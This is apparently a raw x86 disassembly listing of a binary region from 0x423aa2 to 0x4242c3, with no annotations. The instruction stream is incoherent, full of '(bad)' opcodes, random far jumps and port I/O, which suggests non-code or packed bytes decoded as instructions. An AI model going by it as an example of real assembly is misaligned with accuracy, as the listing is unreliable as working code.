  423aa2:	sbb    BYTE PTR [ecx-0x560debb2],bh
  423aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423aa9:	jns    0x423b18
  423aab:	dec    ebp
  423aac:	or     edi,ecx
  423aae:	or     al,0x3a
  423ab0:	les    esi,FWORD PTR [edi-0x26]
  423ab3:	or     BYTE PTR ds:0x993b972f,bh
  423ab9:	sbb    al,BYTE PTR [edi]
  423abb:	neg    bh
  423abd:	test   DWORD PTR [edi+0xc9fbc6d],esp
  423ac3:	addr16 in al,0xb
  423ac6:	jmp    0x1feb:0xf2d0a0ff
  423acd:	and    BYTE PTR [edi-0x33],bh
  423ad0:	lahf   
  423ad1:	popa   
  423ad2:	jg     0x423af5
  423ad4:	loop   0x423a99
  423ad6:	push   0xb974778e
  423adb:	cwde   
  423adc:	jge    0x423adb
  423ade:	or     ebx,edx
  423ae0:	add    al,0x83
  423ae2:	jg     0x423b59
  423ae4:	xor    esi,DWORD PTR [eax]
  423ae6:	xor    DWORD PTR [ecx*2-0x77a838da],esp
  423aed:	(bad)  
  423aee:	xchg   edi,eax
  423aef:	sar    BYTE PTR [ebp-0x57],1
  423af2:	jle    0x423b5c
  423af4:	dec    edx
  423af5:	mov    ch,BYTE PTR [eax+0x25]
  423af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af9:	xor    DWORD PTR [ecx-0x5b9f4b5e],edx
  423aff:	mov    ebx,0x5a597b51
  423b04:	retf   0x96d9
  423b07:	pop    esi
  423b08:	xor    dl,BYTE PTR [eax]
  423b0a:	xor    esi,edi
  423b0c:	(bad)  
  423b0d:	and    cl,ch
  423b0f:	stc    
  423b10:	iret   
  423b11:	and    al,0xdf
  423b13:	mov    dl,0x4
  423b15:	and    al,0x26
  423b17:	fbstp  TBYTE PTR [eax+0x17]
  423b1a:	dec    eax
  423b1b:	lock sbb eax,0x1b395739
  423b21:	jbe    0x423b74
  423b23:	push   0x692e0ab7
  423b28:	in     eax,dx
  423b29:	and    al,dh
  423b2b:	icebp  
  423b2c:	pop    ebx
  423b2d:	dec    edi
  423b2e:	pop    es
  423b2f:	pop    esp
  423b30:	push   ds
  423b31:	jecxz  0x423b20
  423b33:	scas   eax,DWORD PTR es:[edi]
  423b34:	xor    BYTE PTR [eax*1+0x790b517],dh
  423b3b:	fdivrp st(1),st
  423b3d:	test   DWORD PTR [eax*8-0x6b65f580],ebx
  423b44:	sbb    esi,DWORD PTR [ebp-0x73]
  423b47:	fiadd  WORD PTR [esi+0x40947d1c]
  423b4d:	sub    DWORD PTR [esi+0xf],ecx
  423b50:	mov    al,0x37
  423b52:	in     eax,dx
  423b53:	or     al,0x2e
  423b55:	cmp    BYTE PTR [esi],ch
  423b57:	call   0x8810:0x2006c0a6
  423b5e:	sahf   
  423b5f:	fst    st(5)
  423b61:	pslld  mm4,QWORD PTR ds:0x2b907ff0
  423b68:	icebp  
  423b69:	pop    edi
  423b6a:	add    BYTE PTR [edi-0x2147487f],ah
  423b70:	mov    BYTE PTR [esi-0x2],dh
  423b73:	and    bl,cl
  423b75:	test   DWORD PTR [edx+0x286fb04a],ecx
  423b7b:	not    DWORD PTR [ebp+0x6e]
  423b7e:	and    DWORD PTR [eax+0x66],0x73
  423b82:	cmp    BYTE PTR [edx-0x20],ah
  423b85:	dec    edx
  423b86:	push   esi
  423b87:	push   eax
  423b88:	mov    fs:0x770a71e7,al
  423b8e:	ds test eax,0x41c9878c
  423b94:	in     eax,0x15
  423b96:	ss mov esp,0xccfd02e5
  423b9c:	fwait
  423b9d:	cmp    ah,BYTE PTR [edi-0x344a4d34]
  423ba3:	bound  edx,QWORD PTR [ebx+edi*8+0x79]
  423ba7:	mov    dl,al
  423ba9:	mov    eax,DWORD PTR [edx-0x1e605421]
  423baf:	leave  
  423bb0:	push   cs
  423bb1:	xor    ecx,ebp
  423bb3:	paddsw mm3,QWORD PTR [ebp+ebp*8-0x52483d7e]
  423bbb:	mov    bh,0x43
  423bbd:	enter  0xb2ab,0xd9
  423bc1:	outs   dx,BYTE PTR ds:[esi]
  423bc2:	ret    
  423bc3:	add    DWORD PTR [ebp+eax*4+0x45],0xaed85123
  423bcb:	stos   BYTE PTR es:[edi],al
  423bcc:	mov    ecx,DWORD PTR [ebx]
  423bce:	cmp    ah,BYTE PTR [edi-0x6be376dd]
  423bd4:	jl     0x423b69
  423bd6:	scas   eax,DWORD PTR es:[edi]
  423bd7:	fisub  WORD PTR [ebx+0x7cfe3e43]
  423bdd:	mov    esi,0x742fb826
  423be2:	adc    ah,bl
  423be4:	mov    ecx,0xfd3c76b2
  423be9:	retf   
  423bea:	pop    ecx
  423beb:	pusha  
  423bec:	xlat   BYTE PTR ds:[ebx]
  423bed:	icebp  
  423bee:	ja     0x423bbe
  423bf0:	adc    ebx,DWORD PTR [eax-0x74]
  423bf3:	popf   
  423bf4:	cli    
  423bf5:	into   
  423bf6:	aam    0x8c
  423bf8:	mov    esi,0xbc2ff6d
  423bfd:	jge    0x423c7d
  423bff:	xchg   dl,ah
  423c01:	dec    edx
  423c02:	mov    bh,0x91
  423c04:	or     esp,DWORD PTR [ebp+0x16dca1ad]
  423c0a:	ds jne 0x423c23
  423c0d:	ss push esi
  423c0f:	dec    ebp
  423c10:	mov    BYTE PTR [edx+ebp*2-0x76df3f37],bh
  423c17:	adc    BYTE PTR [ebx-0x6dd6bc34],cl
  423c1d:	aaa    
  423c1e:	adc    eax,0x1c059526
  423c23:	sbb    bl,BYTE PTR [ecx]
  423c25:	mov    edx,edx
  423c27:	xlat   BYTE PTR ds:[ebx]
  423c28:	mov    dl,0xce
  423c2a:	mov    bl,0xa0
  423c2c:	outs   dx,BYTE PTR ds:[esi]
  423c2d:	add    al,0x97
  423c2f:	or     eax,0x19245f8
  423c34:	mov    al,ds:0x5052d460
  423c39:	jmp    0x423c23
  423c3b:	pop    edx
  423c3c:	pop    edi
  423c3d:	ins    BYTE PTR es:[edi],dx
  423c3e:	rcl    BYTE PTR [eax-0x10525bb],0xb7
  423c45:	adc    bl,BYTE PTR [ecx]
  423c47:	pop    ds
  423c48:	leave  
  423c49:	or     DWORD PTR [ecx-0x7af2b770],esi
  423c4f:	mov    ah,0x6d
  423c51:	or     eax,ebp
  423c53:	(bad)  
  423c55:	pop    esi
  423c56:	retf   0x920d
  423c59:	pushf  
  423c5a:	mov    dl,0x97
  423c5c:	test   eax,ebp
  423c5e:	pop    ebx
  423c5f:	mov    al,BYTE PTR [ebx-0x73]
  423c62:	inc    ebp
  423c63:	jno    0x423c57
  423c65:	test   eax,0x525e6702
  423c6a:	mov    dl,0xfd
  423c6c:	int3   
  423c6d:	mov    al,0x7f
  423c6f:	mov    fs,edx
  423c71:	inc    ebx
  423c72:	xor    al,0x7e
  423c74:	je     0x423cad
  423c76:	ffreep st(7)
  423c78:	and    eax,0x89598921
  423c7d:	sub    ah,bh
  423c7f:	xor    bh,BYTE PTR [ebp+ebp*4+0x71]
  423c83:	sti    
  423c84:	fcom   QWORD PTR [ecx-0x53]
  423c87:	enter  0x1b76,0xc6
  423c8b:	and    ch,ah
  423c8d:	int3   
  423c8e:	rol    BYTE PTR [edi+0x52469f2d],1
  423c94:	sbb    al,0x9
  423c96:	inc    ebx
	...
  423d13:	add    dl,cl
  423d15:	push   0xffffffe7
  423d17:	ja     0x423d00
  423d19:	(bad)  
  423d1a:	(bad)  
  423d1c:	daa    
  423d1d:	inc    ebx
  423d1e:	call   0x7aec969d
  423d23:	and    BYTE PTR [ecx+edx*8+0x76b0001],0x0
  423d2b:	add    BYTE PTR [edi],bl
  423d2d:	mov    esi,DWORD PTR [eax]
  423d2f:	aas    
  423d30:	icebp  
  423d31:	mov    dh,0xa2
  423d33:	pop    eax
  423d34:	add    al,0x27
  423d36:	xor    eax,DWORD PTR [esi-0x7e]
  423d39:	push   ecx
  423d3a:	jmp    0x322c:0x9a3319ac
  423d41:	nop
  423d42:	push   ebp
  423d43:	dec    eax
  423d44:	inc    edi
  423d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d46:	call   FWORD PTR [esi-0x1c5c7e65]
  423d4c:	lahf   
  423d4d:	push   cs
  423d4e:	sbb    ebp,0xe3b3651c
  423d54:	repz cmp ch,BYTE PTR [edx]
  423d57:	in     al,0x30
  423d59:	push   edx
  423d5a:	ins    BYTE PTR es:[edi],dx
  423d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d5c:	leave  
  423d5d:	in     al,dx
  423d5e:	jge    0x423d88
  423d60:	sbb    DWORD PTR [esi-0x24449d39],0x1025df88
  423d6a:	test   eax,0xec65fa61
  423d6f:	jnp    0x423d74
  423d71:	sbb    eax,0xdecf0edb
  423d76:	dec    ebp
  423d77:	outs   dx,DWORD PTR ds:[esi]
  423d78:	ja     0x423ddd
  423d7a:	push   ebp
  423d7b:	ret    0x37c5
  423d7e:	sti    
  423d7f:	mov    BYTE PTR [eax+0x5],ah
  423d82:	jnp    0x423dcb
  423d84:	cli    
  423d85:	xchg   esi,eax
  423d86:	or     al,0x4b
  423d88:	loope  0x423d9e
  423d8a:	pop    edx
  423d8b:	dec    ebx
  423d8c:	retf   0x6eb1
  423d8f:	retf   0x9d33
  423d92:	sbb    ecx,ebp
  423d94:	jle    0x423e10
  423d96:	sbb    ah,BYTE PTR [edi+0x65]
  423d99:	xchg   esi,eax
  423d9a:	jo     0x423e16
  423d9c:	push   esp
  423d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d9e:	out    0x79,al
  423da0:	sub    dh,BYTE PTR [edx-0x74]
  423da3:	cmp    ecx,DWORD PTR [eax+0x54]
  423da6:	fdivr  QWORD PTR [bx]
  423da9:	mov    esi,0x48cd4b4f
  423dae:	(bad)  
  423daf:	call   0x78c0f73
  423db4:	or     dh,0x5d
  423db7:	add    eax,esp
  423db9:	push   cs
  423dba:	dec    edx
  423dbb:	dec    esp
  423dbc:	add    eax,0x11042d3f
  423dc1:	fdiv   DWORD PTR [eax*8-0x638d8aa8]
  423dc8:	ret    
  423dc9:	fist   DWORD PTR [ebp+0x75]
  423dcc:	out    0x8a,eax
  423dce:	and    esi,DWORD PTR [ecx+0x5b111431]
  423dd4:	retf   
  423dd5:	jle    0x423e04
  423dd7:	(bad)  
  423dd8:	dec    ebx
  423dd9:	jp     0x423dee
  423ddb:	push   esi
  423ddc:	xchg   esi,eax
  423ddd:	xchg   edi,eax
  423dde:	inc    esp
  423ddf:	mov    eax,0xe3196001
  423de4:	dec    esi
  423de5:	aas    
  423de6:	xor    ebx,DWORD PTR [ecx+0x7d]
  423de9:	xor    al,bh
  423deb:	cdq    
  423dec:	inc    esp
  423ded:	jne    0x423dd6
  423def:	popf   
  423df0:	(bad)
  423df4:	cmp    BYTE PTR [edi],bh
  423df6:	pop    ss
  423df7:	ficom  WORD PTR [edi+0x7d]
  423dfa:	cmp    al,0xa7
  423dfc:	jns    0x423e48
  423dfe:	push   0xc209ca27
  423e03:	in     eax,dx
  423e04:	fdivr  QWORD PTR [edx+0x4b]
  423e07:	jmp    0x423df3
  423e09:	pop    eax
  423e0a:	jge    0x423de9
  423e0c:	stc    
  423e0d:	adc    al,dh
  423e0f:	push   ebp
  423e10:	fsub   st(5),st
  423e12:	mov    al,0x60
  423e14:	repnz push es
  423e16:	loope  0x423df8
  423e18:	add    al,0xb7
  423e1a:	punpcklwd mm7,mm5
  423e1d:	aas    
  423e1e:	arpl   WORD PTR [ebx],sp
  423e20:	dec    ebp
  423e21:	adc    ah,0x7
  423e24:	dec    edi
  423e25:	dec    ecx
  423e26:	mul    DWORD PTR [esi]
  423e28:	jb     0x423dad
  423e2a:	jg     0x423dc1
  423e2c:	cmp    al,0xe8
  423e2e:	push   eax
  423e2f:	les    ebx,FWORD PTR [eax]
  423e31:	jl     0x423e8d
  423e33:	inc    ebx
  423e34:	add    BYTE PTR [ebx],bl
  423e36:	or     eax,0x672fa200
  423e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e3c:	or     bl,ch
  423e3e:	aam    0xeb
  423e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e41:	mov    ebp,0x8a3d38b0
  423e46:	test   esi,0x9058e8a5
  423e4c:	mov    esp,0x1b036a26
  423e51:	outs   dx,BYTE PTR ds:[esi]
  423e52:	push   edx
  423e53:	pop    eax
  423e54:	mov    bh,BYTE PTR [edx-0x19]
  423e57:	mov    al,ds:0x74a09b7f
  423e5c:	push   esp
  423e5d:	sub    bh,BYTE PTR [ecx]
  423e5f:	rol    DWORD PTR [ebx],cl
  423e61:	das    
  423e62:	retf   
  423e63:	jne    0x423ebb
  423e65:	ret    
  423e66:	(bad)  
  423e67:	and    BYTE PTR [ecx+0x537b6085],ah
  423e6d:	test   BYTE PTR [esi],bl
  423e6f:	test   eax,0x91820105
  423e74:	mov    ecx,0x994a9c3d
  423e79:	lea    ebp,[ecx]
  423e7b:	push   ecx
  423e7c:	pop    esp
  423e7d:	in     al,dx
  423e7e:	fst    DWORD PTR [edx]
  423e80:	adc    DWORD PTR [ecx-0x56],esi
  423e83:	pop    esi
  423e84:	cmp    ebp,eax
  423e86:	cmp    BYTE PTR [esp+ebx*2+0x2c27e43d],cl
  423e8d:	mov    al,0x5c
  423e8f:	and    DWORD PTR [esi+ebp*2-0x4adb3d71],0xce524371
  423e9a:	lahf   
  423e9b:	jl     0x423e67
  423e9d:	sbb    DWORD PTR [edi+0x47],0xb5875e81
  423ea4:	jnp    0x423f04
  423ea6:	out    0xb8,eax
  423ea8:	push   0x62e95504
  423ead:	pop    ss
  423eae:	out    dx,eax
  423eaf:	(bad)  
  423eb1:	mov    fs,WORD PTR [ebx+0x25227cb]
  423eb7:	mov    ecx,0x4d2f4667
  423ebc:	and    BYTE PTR [edi],cl
  423ebe:	jmp    0xa4c78563
  423ec3:	inc    ebx
  423ec4:	les    edi,FWORD PTR [edx]
  423ec6:	scas   eax,DWORD PTR es:[edi]
  423ec7:	scas   eax,DWORD PTR es:[edi]
  423ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ec9:	fisttp WORD PTR [ebx+0x42a9968f]
  423ecf:	xor    ebx,ecx
  423ed1:	lock sub ch,al
  423ed4:	das    
  423ed5:	or     al,0x79
  423ed7:	out    dx,al
  423ed8:	(bad)  
  423ed9:	pop    edi
  423eda:	add    al,0xe3
  423edc:	lods   eax,DWORD PTR ds:[esi]
  423edd:	push   ebp
  423ede:	cld    
  423edf:	ret    
  423ee0:	ror    cl,1
  423ee2:	xor    DWORD PTR [eax+0x5045ccba],esi
  423ee8:	fnstcw WORD PTR [ebp-0x3dd9640a]
  423eee:	dec    ebp
  423eef:	adc    edx,edx
  423ef1:	xchg   ebx,eax
  423ef2:	call   0xd64752b2
  423ef7:	or     esp,DWORD PTR [ecx-0xb]
  423efa:	cmp    dh,bl
  423efc:	cmp    DWORD PTR [edx-0x79ca45ab],edx
  423f02:	xchg   edi,eax
  423f03:	or     eax,0x6b722179
  423f08:	loop   0x423f1f
  423f0a:	rol    ebp,1
  423f0c:	xchg   ebx,eax
  423f0d:	test   al,0xae
  423f0f:	sub    eax,0xfe2207ec
  423f14:	jo     0x423ea4
  423f16:	mov    ch,0x15
  423f18:	mov    BYTE PTR [ebx],al
  423f1a:	push   ss
  423f1b:	sub    bh,ch
  423f1d:	loope  0x423efa
  423f1f:	stc    
  423f20:	dec    edi
  423f21:	adc    BYTE PTR [esi+esi*1+0x454d2e19],al
  423f28:	xor    al,0xb0
  423f2a:	mov    al,0xca
  423f2c:	add    DWORD PTR [ebx+0x47],edi
  423f2f:	pushf  
  423f30:	push   ebx
  423f31:	xor    BYTE PTR [ecx+eax*4],ch
  423f34:	pop    esp
  423f35:	stos   BYTE PTR es:[edi],al
  423f36:	clc    
  423f37:	lea    ebx,[edi-0x3c82f551]
  423f3d:	clc    
  423f3e:	xchg   edi,eax
  423f3f:	cmp    bl,BYTE PTR [edi-0x3042609e]
  423f45:	adc    BYTE PTR [ebx+0x7],al
  423f48:	adc    eax,0xe2df5b52
  423f4d:	out    0xdb,eax
  423f4f:	or     al,0x15
  423f51:	mov    ds:0xda76fa21,eax
  423f56:	add    eax,0x51b630ba
  423f5b:	sbb    eax,0xb60982d4
  423f60:	mov    ds:0xf2a75145,al
  423f65:	xor    bh,BYTE PTR [eax+0x45]
  423f68:	jne    0x423f91
  423f6a:	jle    0x423f7c
  423f6c:	fsub   QWORD PTR [ebp-0x65d928fe]
  423f72:	push   esp
  423f73:	out    0x38,al
  423f75:	jb     0x423f3c
  423f77:	dec    edx
  423f78:	(bad)  
  423f79:	retf   0x16fc
  423f7c:	xlat   BYTE PTR ds:[ebx]
  423f7d:	sub    esp,eax
  423f7f:	add    dh,BYTE PTR [ecx]
  423f81:	dec    esp
  423f82:	mov    al,ds:0xf85fbeb1
  423f87:	rep lods eax,DWORD PTR ds:[esi]
  423f89:	loop   0x423fe6
  423f8b:	mov    dl,0x25
  423f8d:	xchg   edi,eax
  423f8e:	mov    bh,0xad
  423f90:	mov    gs,WORD PTR [eax+0x72]
  423f93:	mov    esp,0xe860edef
  423f98:	cdq    
  423f99:	mov    ss,WORD PTR [esi+0x2c]
  423f9c:	push   ebx
  423f9d:	inc    esi
  423f9e:	dec    edx
  423f9f:	add    DWORD PTR [ebp-0x3ca43149],esp
  423fa5:	mov    DWORD PTR [ebp-0x30],edi
  423fa8:	in     al,0xed
  423faa:	add    bh,BYTE PTR [ebp-0x2a8c34b4]
  423fb0:	or     eax,ecx
  423fb2:	cmc    
  423fb3:	xchg   esp,eax
  423fb4:	and    esi,DWORD PTR [ebp+0x70]
  423fb7:	mov    eax,0x897116e6
  423fbc:	add    BYTE PTR [esi-0x2],dh
  423fbf:	ins    BYTE PTR es:[edi],dx
  423fc0:	push   edx
  423fc1:	xchg   DWORD PTR [eax],esi
  423fc3:	mov    ?,ebp
  423fc5:	xor    DWORD PTR [ecx+esi*8],ebp
  423fc8:	sub    bh,dh
  423fca:	and    ebp,DWORD PTR [ebx-0x24]
  423fcd:	out    0xdd,al
  423fcf:	push   ecx
  423fd0:	(bad)  
  423fd1:	mov    bh,BYTE PTR [edi]
  423fd3:	mov    ch,0x80
  423fd5:	mov    WORD PTR [eax],fs
  423fd7:	shl    BYTE PTR [eax],cl
  423fd9:	les    edi,FWORD PTR [edi+0x5f]
  423fdc:	fcmovnb st,st(0)
  423fde:	iret   
  423fdf:	jo     0x42403b
  423fe1:	fsub   DWORD PTR [esi+edx*8-0x62]
  423fe5:	mov    DWORD PTR [edi+0x378c53c0],esi
  423feb:	jns    0x423ff2
  423fed:	mov    bh,0xb1
  423fef:	dec    edi
  423ff0:	outs   dx,DWORD PTR ds:[esi]
  423ff1:	ins    BYTE PTR es:[edi],dx
  423ff2:	mov    al,0x33
  423ff4:	test   DWORD PTR [ecx+eiz*2+0x7f23ec75],esi
  423ffb:	xor    dl,BYTE PTR [ebp-0xf839880]
  424001:	test   BYTE PTR [eax-0x2aaaf4d9],0xd9
  424008:	sahf   
  424009:	(bad)  
  42400a:	daa    
  42400b:	adc    DWORD PTR [edx],edi
  42400d:	pop    ecx
  42400e:	retf   
  42400f:	lahf   
  424010:	jle    0x42405a
  424012:	ins    DWORD PTR es:[edi],dx
  424013:	(bad)  
  424014:	popf   
  424015:	mov    WORD PTR cs:[ecx],ss
  424018:	in     eax,dx
  424019:	das    
  42401a:	push   cs
  42401b:	iret   
  42401c:	call   0x7789138e
  424021:	mov    al,ds:0xb4eb5d4c
  424026:	fcmovu st,st(5)
  424028:	shl    BYTE PTR [edi],cl
  42402a:	std    
  42402b:	add    al,0xac
  42402d:	cmp    BYTE PTR [esi],al
  42402f:	scas   eax,DWORD PTR es:[edi]
  424030:	(bad)  
  424031:	xchg   esp,eax
  424032:	imul   eax,DWORD PTR [ecx],0xffffffbe
  424035:	mov    dh,0x32
  424037:	and    dh,BYTE PTR [ebx-0x64]
  42403a:	or     BYTE PTR [eax+ecx*8-0x65a8bebf],bh
  424041:	fstp   QWORD PTR [esi]
  424043:	popa   
  424044:	inc    esi
  424045:	std    
  424046:	xchg   ebx,eax
  424047:	pop    edx
  424048:	mov    ch,0x51
  42404a:	pop    edi
  42404b:	add    DWORD PTR ds:0xaee0c36e,esi
  424051:	fldcw  WORD PTR es:[ecx+0x4b]
  424055:	mov    DWORD PTR [ecx-0x75209014],ecx
  42405b:	call   0x879d:0xd113d21e
  424062:	pop    eax
  424063:	je     0x423fec
  424065:	cmp    eax,0x7515ee09
  42406a:	cmc    
  42406b:	mov    al,ds:0x31e1b243
  424070:	dec    edi
  424071:	fidiv  DWORD PTR cs:[esi+eiz*8+0x2]
  424076:	add    edi,eax
  424078:	test   BYTE PTR [edi+0x32],0x3e
  42407c:	fadd   st(3),st
  42407e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42407f:	sar    bl,1
  424081:	xchg   edx,eax
  424082:	jae    0x4240c6
  424084:	mov    DWORD PTR [eax],ecx
  424086:	mov    ebx,0x55b75caf
  42408b:	dec    esp
  42408c:	adc    DWORD PTR [esi],edi
  42408e:	bound  esp,QWORD PTR [edi+0xd]
  424091:	aam    0xf4
  424093:	sbb    al,ah
  424095:	je     0x424071
  424097:	jg     0x4240bd
  424099:	xchg   esp,eax
  42409a:	and    BYTE PTR [ebx],ah
  42409c:	xchg   ecx,eax
  42409d:	dec    edi
  42409e:	jecxz  0x424025
  4240a0:	dec    eax
  4240a1:	cwde   
  4240a2:	push   edx
  4240a3:	sub    al,0xeb
  4240a5:	xor    eax,0xa9ad4a3f
  4240aa:	scas   eax,DWORD PTR es:[edi]
  4240ab:	arpl   WORD PTR [edx-0x4bb86442],si
  4240b1:	call   0x7f33d850
  4240b6:	fcomp  DWORD PTR [esi+0x56]
  4240b9:	(bad)  
  4240ba:	leave  
  4240bb:	push   ebp
  4240bc:	push   esp
  4240bd:	test   BYTE PTR [eiz*4-0x5b1b18a7],dh
  4240c4:	or     dh,bl
  4240c6:	xor    bh,BYTE PTR [ecx+esi*4]
  4240c9:	scas   al,BYTE PTR es:[edi]
  4240ca:	mov    ecx,DWORD PTR [esi-0x113bea5f]
  4240d0:	xchg   BYTE PTR [edi-0x1e],ah
  4240d3:	xchg   ebp,eax
  4240d4:	push   cs
  4240d5:	sbb    edi,esi
  4240d7:	xchg   edx,eax
  4240d8:	retf   
  4240d9:	fidivr WORD PTR [ebx+0x3c8a5d2e]
  4240df:	pop    eax
  4240e0:	in     al,dx
  4240e1:	fmul   QWORD PTR [edi+0x70]
  4240e4:	es or  al,dh
  4240e7:	fcmovne st,st(0)
  4240e9:	in     al,dx
  4240ea:	sti    
  4240eb:	add    DWORD PTR [edx+0x2a],ecx
  4240ee:	popa   
  4240ef:	fnstcw WORD PTR [ebx]
  4240f1:	jge    0x424087
  4240f3:	imul   ebx,ebx,0x48
  4240f6:	and    BYTE PTR [ebp-0x12],dh
  4240f9:	mov    ebp,0x986cbfb
  4240fe:	int3   
  4240ff:	scas   al,BYTE PTR es:[edi]
  424100:	add    edi,ecx
  424102:	add    dl,BYTE PTR ds:0x45a33e9
  424108:	adc    al,BYTE PTR [ebx-0x3a99ef0e]
  42410e:	outs   dx,BYTE PTR ds:[esi]
  42410f:	xor    eax,0x4d96707f
  424114:	test   al,0xf8
  424116:	mov    DWORD PTR [edx],eax
  424118:	or     edi,DWORD PTR [esi-0x7]
  42411b:	das    
  42411c:	sub    BYTE PTR [edi+eax*2+0x2e],0xcc
  424121:	push   bp
  424123:	mov    bh,0x4d
  424125:	ret    0xc75f
  424128:	rcr    DWORD PTR [ecx-0xdfa2854],0x76
  42412f:	cli    
  424130:	sub    BYTE PTR [edi],ah
  424132:	and    al,BYTE PTR [ecx]
  424134:	fidivr DWORD PTR [esi]
  424136:	fldcw  WORD PTR [edi]
  424138:	mov    ds:0xc951647e,al
  42413d:	mov    esi,DWORD PTR [eax-0x6df60ac8]
  424143:	clc    
  424144:	icebp  
  424145:	push   eax
  424146:	inc    edi
  424147:	mov    edx,0xfa9054b7
  42414c:	push   esp
  42414d:	lea    ebx,[edx]
  42414f:	loopne 0x42412c
  424151:	retf   0x3d3
  424154:	fdiv   DWORD PTR [ecx+0x37]
  424157:	loopne 0x42419a
  424159:	jno    0x4240eb
  42415b:	cmp    dl,BYTE PTR [esi]
  42415d:	adc    BYTE PTR [edi+0x515eeece],dh
  424163:	out    dx,al
  424164:	sbb    al,0x33
  424166:	sub    bl,BYTE PTR ds:0x3d4e6dae
  42416c:	pop    esi
  42416d:	arpl   WORD PTR [ecx+0x35],sp
  424170:	dec    edx
  424171:	clc    
  424172:	call   0xb04acbdf
  424177:	add    al,0x7a
  424179:	mov    DWORD PTR [eax+0x38],esi
  42417c:	mov    ch,0x18
  42417e:	test   al,0x38
  424180:	mov    ebp,0x6dda37fa
  424185:	adc    cl,BYTE PTR [eax]
  424187:	push   ecx
  424188:	ret    
  424189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42418a:	xchg   edi,eax
  42418b:	xor    ecx,esp
  42418d:	std    
  42418e:	jns    0x4241d8
  424190:	(bad)  [edx+edx*1]
  424193:	loop   0x42416f
  424195:	shl    cl,cl
  424197:	std    
  424198:	call   0x8659b65f
  42419d:	add    eax,0x9ce00f66
  4241a2:	mov    gs,WORD PTR [ecx+edx*4]
  4241a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241a6:	push   cs
  4241a7:	xchg   ebp,eax
  4241a8:	rol    ecx,1
  4241aa:	out    0x81,al
  4241ac:	jne    0x424167
  4241ae:	adc    DWORD PTR [ebx],ebp
  4241b0:	push   ecx
  4241b1:	jmp    0x42416c
  4241b3:	mov    eax,ds:0xafd6fa85
  4241b8:	clc    
  4241b9:	xchg   BYTE PTR [ebx+0x1],bl
  4241bc:	ins    DWORD PTR es:[edi],dx
  4241bd:	popa   
  4241be:	add    bh,BYTE PTR [ecx+0x50b58ad]
  4241c4:	cdq    
  4241c5:	and    eax,0x5ce30150
  4241ca:	(bad)  
  4241cb:	mov    ah,BYTE PTR [edx+0x4a16c07c]
  4241d1:	xchg   DWORD PTR [esi],edi
  4241d3:	clc    
  4241d4:	adc    eax,0x2693f7ee
  4241d9:	popf   
  4241da:	cdq    
  4241db:	mov    edi,0x40fd9302
  4241e0:	cld    
  4241e1:	sbb    DWORD PTR [eax],eax
  4241e3:	call   0x6d85:0x10c5d390
  4241ea:	pop    ecx
  4241eb:	xchg   BYTE PTR [ecx-0x2166c208],dh
  4241f1:	sahf   
  4241f2:	pusha  
  4241f3:	pop    ebx
  4241f4:	pop    eax
  4241f5:	mov    cl,0x19
  4241f7:	pop    ss
  4241f8:	and    DWORD PTR [ecx-0x36],ebx
  4241fb:	fisubr WORD PTR [ebx+0x28]
  4241fe:	xlat   BYTE PTR ds:[ebx]
  4241ff:	outs   dx,BYTE PTR ds:[esi]
  424200:	jae    0x42426e
  424202:	xor    DWORD PTR [ebp+ebx*1+0x32285ec],eax
  424209:	out    dx,eax
  42420a:	jp     0x424212
  42420c:	mov    ds:0xc680bcbb,eax
  424211:	scas   eax,DWORD PTR es:[edi]
  424212:	enter  0x3834,0x2d
  424216:	pop    ds
  424217:	jle    0x424237
  424219:	popf   
  42421a:	and    DWORD PTR [ebx+0x5c],0x77db456d
  424221:	inc    ecx
  424222:	mov    ebx,0x279b992b
  424227:	out    0xcc,al
  424229:	(bad)  
  42422a:	clc    
  42422b:	sbb    al,dh
  42422d:	inc    ebp
  42422e:	jns    0x42422e
  424230:	xchg   esi,eax
  424231:	mov    bl,0x21
  424233:	outs   dx,DWORD PTR ds:[esi]
  424234:	repz jae 0x4241fa
  424237:	jg     0x4242a3
  424239:	jp     0x424258
  42423b:	mov    ebp,0x3716b11f
  424240:	sub    dl,BYTE PTR [ebp+0x4853d059]
  424246:	arpl   WORD PTR [esi+esi*1-0x331b4de5],ax
  42424d:	sbb    DWORD PTR [eax-0x24],0x70
  424251:	xor    BYTE PTR [ecx-0x2bbce153],0x19
  424258:	add    al,0xd3
  42425a:	or     BYTE PTR [edi+0x72cb9ea4],dh
  424260:	daa    
  424261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424262:	pop    eax
  424263:	in     al,dx
  424264:	jg     0x4241ee
  424266:	cli    
  424267:	(bad)  
  424268:	in     al,dx
  424269:	pop    edx
  42426a:	cdq    
  42426b:	jp     0x424278
  42426d:	inc    ecx
  42426e:	ss pop ss
  424270:	shr    DWORD PTR [ecx],cl
  424272:	mov    ebx,0xc92b0f5a
  424277:	nop
  424278:	mov    bl,BYTE PTR ds:0x9e036e27
  42427e:	adc    ch,BYTE PTR [edx-0x2eeac116]
  424284:	call   0xc344:0xf2e587ca
  42428b:	sub    ecx,DWORD PTR [edi+0x3f]
  42428e:	bound  edx,QWORD PTR [ecx]
  424290:	jbe    0x424231
  424292:	rol    BYTE PTR [esi+0x216a4975],0xcb
  424299:	sub    eax,0x70087803
  42429e:	ins    BYTE PTR es:[edi],dx
  42429f:	pop    ds
  4242a0:	xor    al,0x5b
  4242a2:	adc    DWORD PTR [edi+0x6d5f194d],ebp
  4242a8:	sbb    eax,0xe6d2ac4a
  4242ad:	les    edx,FWORD PTR [edx-0x20]
  4242b0:	pushf  
  4242b1:	outs   dx,BYTE PTR ds:[esi]
  4242b2:	push   ebp
  4242b3:	inc    ebp
  4242b4:	mov    bh,0x63
  4242b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242b7:	jne    0x4242dd
  4242b9:	lea    esi,[ebp-0x35]
  4242bc:	jmp    0x97840ba9
  4242c1:	pop    edi
  4242c2:	push   cs
  4242c3:	stos   DWORD PTR es:[edi],eax
